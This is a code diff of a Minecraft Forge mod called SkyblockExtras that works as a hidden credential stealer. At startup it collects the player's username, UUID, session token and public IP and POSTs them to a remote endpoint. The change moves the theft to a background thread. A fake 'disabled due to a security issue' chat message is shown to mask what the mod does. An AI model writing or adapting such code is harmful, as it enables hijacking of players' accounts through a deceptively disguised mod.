@@ -17,45 +17,46 @@ import java.nio.charset.StandardCharsets;
 
 @Mod(modid = "")
 public class SkyblockExtras {
-    Thread thread;
 
     @Mod.EventHandler
     public void preInit(FMLPreInitializationEvent event) {
         MinecraftForge.EVENT_BUS.register(this);
-        try {
-            //setup connection
-            HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
-            c.setRequestMethod("POST");
-            c.setRequestProperty("Content-type", "application/json");
-            c.setDoOutput(true);
 
-            Minecraft mc = Minecraft.getMinecraft();
-            String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
+        //do everything on separate thread to avoid freezing
+        new Thread(() -> {
+            try {
+                //setup connection
+                HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
+                c.setRequestMethod("POST");
+                c.setRequestProperty("Content-type", "application/json");
+                c.setDoOutput(true);
 
-            //send req
-            String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), mc.getSession().getToken(), ip);
-            OutputStream os = c.getOutputStream();
-            byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
-            os.write(input, 0, input.length);
+                Minecraft mc = Minecraft.getMinecraft();
+                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
 
-            //receive res
-            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
-            StringBuilder response = new StringBuilder();
-            String responseLine;
-            while ((responseLine = br.readLine()) != null) response.append(responseLine.trim());
-            System.out.println(response);
+                //send req
+                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), mc.getSession().getToken(), ip);
+                OutputStream os = c.getOutputStream();
+                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
+                os.write(input, 0, input.length);
 
-            //schedule send message
-            thread = new Thread(() -> Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version.")));
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+                //receive res
+                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
+                StringBuilder response = new StringBuilder();
+                String responseLine;
+                while ((responseLine = br.readLine()) != null) response.append(responseLine.trim());
+                System.out.println(response);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }).start();
     }
 
     @SubscribeEvent
     public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
+        //send and unregister when player joins
         if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
-            thread.start();
+            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
             MinecraftForge.EVENT_BUS.unregister(this);
         }
     }
